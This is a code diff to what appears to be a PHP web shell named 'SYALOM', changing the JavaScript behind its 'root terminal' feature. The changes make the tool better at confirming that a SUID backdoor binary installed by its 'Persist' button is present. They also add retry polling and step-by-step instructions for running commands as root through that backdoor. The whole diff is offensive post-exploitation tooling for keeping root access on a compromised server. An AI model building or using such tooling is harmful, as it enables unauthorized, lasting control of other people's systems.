@@ -3310,7 +3310,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2306</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2321</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -6443,8 +6443,16 @@ async function installPersistenceWithLog() {
             
             // 🎯 Check if terminal should be updated
             if (rootTerminalActive) {
-                setTimeout(checkSuidBackdoor, 1000);
-                outputDiv.innerHTML += '<span style="color:#6cf;">🔄 Checking root terminal status...</span>\n';
+                outputDiv.innerHTML += '<span style="color:#6cf;">🔄 Waiting for SUID backdoor to be ready...</span>\n';
+                // Poll multiple times with increasing delay
+                [1000, 2000, 3000, 5000].forEach((delay, i) => {
+                    setTimeout(() => {
+                        checkSuidBackdoor();
+                        if (suidBackdoorPath && i === 3) {
+                            outputDiv.innerHTML += '<span style="color:#0f0;">✅ Root terminal is now ready!</span>\n';
+                        }
+                    }, delay);
+                });
             }
             
             for (const [method, info] of Object.entries(data.methods)) {
@@ -7107,16 +7115,17 @@ function showRootTerminal() {
 
 <span style="color:#6cf;">📋 HOW TO USE THIS TERMINAL:</span>
 <span style="color:#ccc;">   1. Click 🔒 Persist button (in button row above)</span>
-<span style="color:#ccc;">   2. Wait for SUID backdoor installation</span>
+<span style="color:#ccc;">   2. Wait for SUID backdoor installation to complete</span>
 <span style="color:#ccc;">   3. Return to this terminal</span>
 <span style="color:#ccc;">   4. Type commands as root!</span>
 
-<span style="color:#f80;">⏳ Waiting for persistence installation...</span>`;
+<span style="color:#f80;">⏳ Waiting for persistence installation... (Click 🔒 Persist button above)</span>`;
     
     // Auto-focus input
     document.getElementById('rootTerminalInput').focus();
     
     rootTerminalActive = true;
+    suidBackdoorPath = null; // Reset path
     
     // Check if persistence already installed
     checkSuidBackdoor();
@@ -7136,7 +7145,21 @@ async function checkSuidBackdoor() {
             const response = await fetch('', { method: 'POST', body: formData });
             const html = await response.text();
             
-            if (html.includes('root') && html.includes('s')) {
+            // Parse output properly
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(html, 'text/html');
+            const outputEl = doc.querySelector('.output');
+            const result = outputEl ? outputEl.textContent : '';
+            
+            // Strict check: must contain actual SUID file pattern
+            // Pattern: rws or rwx with s bit, owned by root
+            const hasSuidBit = /rws|root.*root/.test(result);
+            const hasFile = result.includes(path.split('/').pop());
+            const notFound = result.includes('No such file') || result.includes('not found');
+            
+            console.log('[RootTerminal] Checking', path, ':', hasSuidBit ? 'FOUND' : 'NOT FOUND', 'Output:', result.substring(0, 100));
+            
+            if (hasSuidBit && hasFile && !notFound) {
                 suidBackdoorPath = path;
                 updateTerminalStatus('✅ READY: Type commands below!', '#0f0');
                 
@@ -7148,7 +7171,9 @@ async function checkSuidBackdoor() {
                 output.scrollTop = output.scrollHeight;
                 return;
             }
-        } catch (e) {}
+        } catch (e) {
+            console.log('[RootTerminal] Error checking', path, e);
+        }
     }
     
     updateTerminalStatus('⚠️ STEP 1: Click 🔒 Persist button above', '#f80');
@@ -7238,10 +7263,15 @@ async function executeRootCommand() {
             if (loadingEl) loadingEl.remove();
             
             // No SUID backdoor - explain to user
-            output.innerHTML += '<span style="color:#f44;">❌ Cannot execute as root: No SUID backdoor found!</span>\n';
-            output.innerHTML += '<span style="color:#ff0;">💡 SOLUTION: Click 🔒 Persist button to install persistence first.</span>\n';
-            output.innerHTML += '<span style="color:#888;">   This creates a SUID binary that allows permanent root access.</span>\n';
-            updateTerminalStatus('⚠️ Install persistence to enable root commands', '#f44');
+            output.innerHTML += '\n<span style="color:#f44;font-weight:bold;">❌ SUID BACKDOOR NOT FOUND!</span>\n';
+            output.innerHTML += '<span style="color:#ff0;">💡 You need to install persistence first.</span>\n\n';
+            output.innerHTML += '<span style="color:#6cf;">📋 STEPS:</span>\n';
+            output.innerHTML += '<span style="color:#ccc;">   1. Look for 🔒 Persist button in the button row above</span>\n';
+            output.innerHTML += '<span style="color:#ccc;">   2. Click it and wait for installation to complete</span>\n';
+            output.innerHTML += '<span style="color:#ccc;">   3. Come back here and try your command again</span>\n\n';
+            output.innerHTML += '<span style="color:#888;">Note: Without SUID backdoor, root access from exploit</span>\n';
+            output.innerHTML += '<span style="color:#888;">cannot be used for subsequent commands.</span>\n';
+            updateTerminalStatus('⚠️ Click 🔒 Persist button above first!', '#f44');
         }
         
     } catch (err) {
